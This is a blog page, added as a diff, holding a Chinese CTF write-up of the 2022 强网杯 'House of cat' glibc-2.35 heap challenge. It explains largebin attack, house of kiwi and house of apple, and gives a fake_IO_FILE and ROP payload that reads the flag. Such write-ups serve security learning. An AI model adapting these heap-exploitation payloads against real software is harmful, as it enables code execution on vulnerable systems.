@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="前言今年的强网杯算上强网先锋总计好像有18题pwn，全部常规的堆题都是在glibc-2.35下的，所以应该都是围绕着IO_FILE部分作为核心考点。 House of cat考点：代码审计绕过限制，orw，largebin_attack + house of apple，触发abort流程 比赛时遇到的问题：用largebin_attack去改Top chunk的size之后在触发abort之前挂">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2022强网杯">
+<meta property="og:url" content="https://github.com/CharonPt/CharonPt.github.io.git/2022/08/04/2022%E5%BC%BA%E7%BD%91%E6%9D%AF/index.html">
+<meta property="og:site_name" content="CharonPt的Blog">
+<meta property="og:description" content="前言今年的强网杯算上强网先锋总计好像有18题pwn，全部常规的堆题都是在glibc-2.35下的，所以应该都是围绕着IO_FILE部分作为核心考点。 House of cat考点：代码审计绕过限制，orw，largebin_attack + house of apple，触发abort流程 比赛时遇到的问题：用largebin_attack去改Top chunk的size之后在触发abort之前挂">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://github.com/2022/08/04/2022%E5%BC%BA%E7%BD%91%E6%9D%AF/houseofkiwi-1.jpg">
+<meta property="og:image" content="https://github.com/2022/08/04/2022%E5%BC%BA%E7%BD%91%E6%9D%AF/houseofkiwi-2.jpg">
+<meta property="og:image" content="https://github.com/2022/08/04/2022%E5%BC%BA%E7%BD%91%E6%9D%AF/houseofkiwi-3.jpg">
+<meta property="og:image" content="https://github.com/2022/08/04/2022%E5%BC%BA%E7%BD%91%E6%9D%AF/houseofkiwi-4.jpg">
+<meta property="og:image" content="https://github.com/2022/08/04/2022%E5%BC%BA%E7%BD%91%E6%9D%AF/houseofkiwi-5.jpg">
+<meta property="og:image" content="https://github.com/2022/08/04/2022%E5%BC%BA%E7%BD%91%E6%9D%AF/houseofkiwi-6.jpg">
+<meta property="article:published_time" content="2022-08-04T10:30:39.000Z">
+<meta property="article:modified_time" content="2022-08-06T16:49:08.054Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="’pwn&#39;">
+<meta property="article:tag" content="2022强网">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/2022/08/04/2022%E5%BC%BA%E7%BD%91%E6%9D%AF/houseofkiwi-1.jpg">
+
+<link rel="canonical" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/08/04/2022%E5%BC%BA%E7%BD%91%E6%9D%AF/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>2022强网杯 | CharonPt的Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">CharonPt的Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/08/04/2022%E5%BC%BA%E7%BD%91%E6%9D%AF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CharonPt的Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2022强网杯
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-08-04 18:30:39" itemprop="dateCreated datePublished" datetime="2022-08-04T18:30:39+08:00">2022-08-04</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-08-07 00:49:08" itemprop="dateModified" datetime="2022-08-07T00:49:08+08:00">2022-08-07</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>今年的强网杯算上强网先锋总计好像有18题pwn，全部常规的堆题都是在glibc-2.35下的，所以应该都是围绕着IO_FILE部分作为核心考点。</p>
+<h2 id="House-of-cat"><a href="#House-of-cat" class="headerlink" title="House of cat"></a>House of cat</h2><p>考点：代码审计绕过限制，orw，largebin_attack + house of apple，触发abort流程</p>
+<p>比赛时遇到的问题：用largebin_attack去改Top chunk的size之后在触发abort之前挂了，常规的gadget + setcontext用不了</p>
+<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>这题的出题人为了增加题目难度，在进入菜单之前还需要代码审计来输入一些东西过check，但是这部分主要是逻辑问题，写出来的意义不大，所以这里就跳过了。</p>
+<p>菜单</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.add a cat\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.delete a cat\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3.show a cat\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4.mini edit\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;plz input your cat choice:\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>具体就不贴了简单说一下：delete存在UAF，add最多16个堆指针，并且因为UAF的存在，最多申请也是16个堆，此外size都在lagrebin范围（0x418-0x46F），show固定输出三十个字节，edit固定写三十个字节，且最多使用两次。</p>
+<p>此外这题的沙箱稍微有点特别，在read的那部分其check的文件描述符是否为0，如果不是则不通过。</p>
+<p>绕过的方法就是先将标准输入关了，然后再open flag的时候flag文件对应的文件描述符就是0，由此通过check</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ seccomp-tools dump ./house_of_cat </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x10 0xc000003e  if (A != ARCH_X86_64) goto 0018</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x0d 0xffffffff  if (A != 0xffffffff) goto 0018</span><br><span class="line"> 0005: 0x15 0x0b 0x00 0x0000013e  if (A == getrandom) goto 0017</span><br><span class="line"> 0006: 0x15 0x0a 0x00 0x00000002  if (A == open) goto 0017</span><br><span class="line"> 0007: 0x15 0x09 0x00 0x00000003  if (A == close) goto 0017</span><br><span class="line"> 0008: 0x15 0x08 0x00 0x00000009  if (A == mmap) goto 0017</span><br><span class="line"> 0009: 0x15 0x07 0x00 0x0000000c  if (A == brk) goto 0017</span><br><span class="line"> 0010: 0x15 0x06 0x00 0x000000e7  if (A == exit_group) goto 0017</span><br><span class="line"> 0011: 0x15 0x00 0x04 0x00000000  if (A != read) goto 0016</span><br><span class="line"> 0012: 0x20 0x00 0x00 0x00000014  A = fd &gt;&gt; 32 # read(fd, buf, count)</span><br><span class="line"> 0013: 0x15 0x00 0x04 0x00000000  if (A != 0x0) goto 0018</span><br><span class="line"> 0014: 0x20 0x00 0x00 0x00000010  A = fd # read(fd, buf, count)</span><br><span class="line"> 0015: 0x15 0x01 0x02 0x00000000  if (A == 0x0) goto 0017 else goto 0018</span><br><span class="line"> 0016: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0018</span><br><span class="line"> 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0018: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>
+
+<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><h4 id="house-of-kiwi中触发IO的方法"><a href="#house-of-kiwi中触发IO的方法" class="headerlink" title="house of kiwi中触发IO的方法"></a>house of kiwi中触发IO的方法</h4><p>当top chunk的size不足时，进入sysmalloc部分，其中存在这样的assert</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">► 2617   assert ((old_top == initial_top (av) &amp;&amp; old_size == 0) ||</span><br><span class="line">  2618           ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">  2619            prev_inuse (old_top) &amp;&amp;</span><br><span class="line">  2620            ((unsigned long) old_end &amp; (pagesize - 1)) == 0));</span><br></pre></td></tr></table></figure>
+
+<p>也就是说：<strong>top chunk的size小于MINSIZE、top chunk的inuse位为0以及top chunk未页对齐</strong>都会触发这个断言</p>
+<p>触发这个断言之后会调用<code>__malloc_assert</code>函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">static void</span><br><span class="line">__malloc_assert (const char *assertion, const char *file, unsigned int line,</span><br><span class="line">		 const char *function)</span><br><span class="line">&#123;</span><br><span class="line">  (void) __fxprintf (NULL, &quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;,</span><br><span class="line">		     __progname, __progname[0] ? &quot;: &quot; : &quot;&quot;,</span><br><span class="line">		     file, line,</span><br><span class="line">		     function ? function : &quot;&quot;, function ? &quot;: &quot; : &quot;&quot;,</span><br><span class="line">		     assertion);</span><br><span class="line">  fflush (stderr);</span><br><span class="line">  abort ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中的<code>fflush(stderr)</code>就会调用<code>_IO_file_jumps</code>下的<code>sync</code>指针</p>
+<img src="/2022/08/04/2022%E5%BC%BA%E7%BD%91%E6%9D%AF/houseofkiwi-1.jpg" class>
+
+<img src="/2022/08/04/2022%E5%BC%BA%E7%BD%91%E6%9D%AF/houseofkiwi-2.jpg" class>
+
+<p>这是其中一种触发方式，另一种如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    victim_index = largebin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);  <span class="comment">//bck == largebin的main_arena</span></span><br><span class="line">    fwd = bck-&gt;fd;  <span class="comment">//fwd == 此时largebin中最大的chunk</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">    <span class="keyword">if</span> (fwd != bck) <span class="comment">//如果这个largebin非空</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">        size |= PREV_INUSE;</span><br><span class="line">        <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">        assert (chunk_main_arena (bck-&gt;bk));</span><br></pre></td></tr></table></figure>
+
+<p>这一部分是<strong>将chunk插入lagrebin时</strong>执行的，只要此时对应largebin中的最小chunk的size中的<code>NON_MAIN_ARENA</code>标志位不为0，则触发这个断言</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NON_MAIN_ARENA 0x4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Check for chunk from main arena.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_main_arena(p) (((p)-&gt;mchunk_size &amp; NON_MAIN_ARENA) == 0)</span></span><br></pre></td></tr></table></figure>
+
+<p>所以这两种触发方式一般可以通过堆溢出来完成，但是在没堆溢出的情况下<strong>可以通过稍微错位一下largebin_attack，将top chunk的size改成0x55这样的值</strong>也可以触发，或者更简单的方法就是直接将<code>malloc_state</code>中记录top chunk地址的那个值改了（位于<code>main_arena+96</code>），那top chunk就变成lagrebin_attack的那个堆地址了，大小也就变成了这个chunk的大小。</p>
+<p>还有个要注意的点就是<code>fake_IO_FILE + 0x88</code>的这个位置（对应FILE结构的成员变量<code>_lock</code>）需要是一个合法地址，否则在这里会clash</p>
+<img src="/2022/08/04/2022%E5%BC%BA%E7%BD%91%E6%9D%AF/houseofkiwi-3.jpg" class>
+
+<p>现在有个疑问就是，<code>__fxprintf</code>也涉及IO，在该函数的调用链中也存在虚表函数指针的调用，所以在我调的exp中最后触发IO的地方其实是在调用<code>__fxprintf</code>函数的过程中，而不是<code>fflush</code>，那house of kiwi是怎么在<code>fflush</code>中触发的IO呢，目前还不是很懂，等复现完house of kiwi的例题之后再来补。</p>
+<p>正常情况下在<code>__fxprintf</code>往后调用到<code>__vfprintf_internal</code>函数时会调用一个虚表函数指针</p>
+<img src="/2022/08/04/2022%E5%BC%BA%E7%BD%91%E6%9D%AF/houseofkiwi-4.jpg" class>
+
+<img src="/2022/08/04/2022%E5%BC%BA%E7%BD%91%E6%9D%AF/houseofkiwi-5.jpg" class>
+
+<p>而如果要劫持<code>stderr</code>的话只要保证<code>fake_IO_FILE + 88</code>的这个位置是合法地址就能执行到这里。</p>
+<img src="/2022/08/04/2022%E5%BC%BA%E7%BD%91%E6%9D%AF/houseofkiwi-6.jpg" class>
+
+<p>那么后面就可以用到正常的<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-273832.htm">house of apple</a>的调用链了</p>
+<p>复现时ROP部分参考了<a target="_blank" rel="noopener" href="https://kagehutatsu.com/?p=723">影二つ师傅</a>的博客，个人感觉这位师傅的fake_IO_struct的构造比较好，另外他使用了mmap来映射flag文件，也是替代read的一种方法，值得学习。</p>
+<p>下面这块fake_IO_struct是我在师傅思路的基础上自己构造的，用的是house of apple中<strong>利用_IO_wfile_overflow函数控制程序执行流</strong>的那一条调用链，应该大多数情况是可以直接套用的，只需要将<code>fp</code>改成改chunk的头部即可，并且使用的gadget在<code>&lt;__spawni_child+1423&gt;</code>，具体如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7ffff7e9688f</span> &lt;__spawni_child+<span class="number">1423</span>&gt;:	mov    rdx,QWORD PTR [rax+<span class="number">0xb0</span>]</span><br><span class="line"><span class="number">0x7ffff7e96896</span> &lt;__spawni_child+<span class="number">1430</span>&gt;:	call   QWORD PTR [rax+<span class="number">0x88</span>]</span><br></pre></td></tr></table></figure>
+
+<p>这个gadget本人第一次见到，所以不知道别的版本是否还有这个gadget</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">fp = heap + <span class="number">0x1370</span></span><br><span class="line">fake_IO_FILE = p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x88</span>-<span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heap)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x30</span> + <span class="number">0x68</span> - <span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(gadget)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xa0</span>-<span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fp + <span class="number">0x30</span>)  <span class="comment"># A = fp + 0x30</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x88</span> + <span class="number">0x30</span> - <span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(setcontext)	<span class="comment">#gadget call</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xd8</span> - <span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(_IO_wfile_jumps-<span class="number">0x20</span>)  <span class="comment"># vtable</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xb0</span> + <span class="number">0x30</span> - <span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fp + <span class="number">0x80</span>)  <span class="comment">#rdx</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xe0</span> + <span class="number">0x30</span> - <span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fp + <span class="number">0x30</span>)  <span class="comment"># B = A</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x110</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fp + <span class="number">0x130</span>)  <span class="comment">#rsp</span></span><br><span class="line">fake_IO_FILE += p64(ret)  <span class="comment">#ret</span></span><br><span class="line">fake_IO_FILE += p64(pop_rdi) + p64(<span class="number">0</span>) + p64(close) + p64(pop_rdi) + p64(fp + <span class="number">0x200</span>) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(pop_rax) + p64(<span class="number">2</span>) + p64(syscall)</span><br><span class="line">fake_IO_FILE += p64(pop_rdi) + p64(<span class="number">0</span>) + p64(pop_rsi) + p64(heap) + p64(pop_rdx) + p64(<span class="number">0x100</span>) + p64(<span class="number">0</span>) + p64(read)</span><br><span class="line">fake_IO_FILE += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi) + p64(heap) + p64(pop_rdx) + p64(<span class="number">0x100</span>) + p64(<span class="number">0</span>) + p64(write)</span><br><span class="line">fake_IO_FILE += <span class="string">b&#x27;flag&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="比赛时踩的坑"><a href="#比赛时踩的坑" class="headerlink" title="比赛时踩的坑"></a>比赛时踩的坑</h5><p>如果用largebin_attack直接将top chunk的size改成堆地址的话，会触发下面这个错误</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  4372       if (__glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">► 4373         malloc_printerr (&quot;malloc(): corrupted top size&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>这个check是试图从top chunk中划chunk时的，其检查top chunk的size是否在合理范围内（这个<code>system_mem</code>也是<code>malloc_state</code>中的一个字段）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p av-&gt;system_mem</span><br><span class="line">$4 = 0x21000</span><br></pre></td></tr></table></figure>
+
+<p>比赛时居然连这个原因都没发现，只能说心还不够静，跟得太快了。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E2%80%99pwn/" rel="tag"># ’pwn'</a>
+              <a href="/tags/2022%E5%BC%BA%E7%BD%91/" rel="tag"># 2022强网</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/07/08/close1%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" rel="prev" title="close1的格式化字符串">
+      <i class="fa fa-chevron-left"></i> close1的格式化字符串
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#House-of-cat"><span class="nav-number"></span> <span class="nav-text">House of cat</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE"><span class="nav-number">1.</span> <span class="nav-text">题目</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="nav-number">2.</span> <span class="nav-text">知识点</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#house-of-kiwi%E4%B8%AD%E8%A7%A6%E5%8F%91IO%E7%9A%84%E6%96%B9%E6%B3%95"><span class="nav-number">2.1.</span> <span class="nav-text">house of kiwi中触发IO的方法</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%AF%94%E8%B5%9B%E6%97%B6%E8%B8%A9%E7%9A%84%E5%9D%91"><span class="nav-number">2.1.1.</span> <span class="nav-text">比赛时踩的坑</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">60</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">40</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
